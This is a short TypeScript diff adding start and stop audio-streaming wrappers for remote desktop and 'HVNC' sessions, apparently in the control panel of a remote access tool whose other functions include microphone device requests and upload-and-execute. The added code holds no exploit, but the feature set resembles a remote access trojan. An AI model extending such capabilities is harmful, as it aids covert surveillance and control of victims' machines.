@@ -234,6 +234,18 @@ export const stopRemoteDesktopCmd = async (
   return invoke("stop_remote_desktop", { addr });
 };
 
+export const startRemoteDesktopAudioCmd = async (
+  addr: string | undefined
+): Promise<void> => {
+  return invoke("start_remote_desktop_audio", { addr });
+};
+
+export const stopRemoteDesktopAudioCmd = async (
+  addr: string | undefined
+): Promise<void> => {
+  return invoke("stop_remote_desktop_audio", { addr });
+};
+
 export const requestMicDevicesCmd = async (
   addr: string | undefined
 ): Promise<void> => {
@@ -386,6 +398,18 @@ export const manageHVNC = async (
   run: string
 ): Promise<void> => {
   return invoke("manage_hvnc", { addr, run });
+};
+
+export const startHVNCFrameAudioCmd = async (
+  addr: string | undefined
+): Promise<void> => {
+  return invoke("start_hvnc_audio", { addr });
+};
+
+export const stopHVNCFrameAudioCmd = async (
+  addr: string | undefined
+): Promise<void> => {
+  return invoke("stop_hvnc_audio", { addr });
 };
 
 export const uploadAndExecute = async (
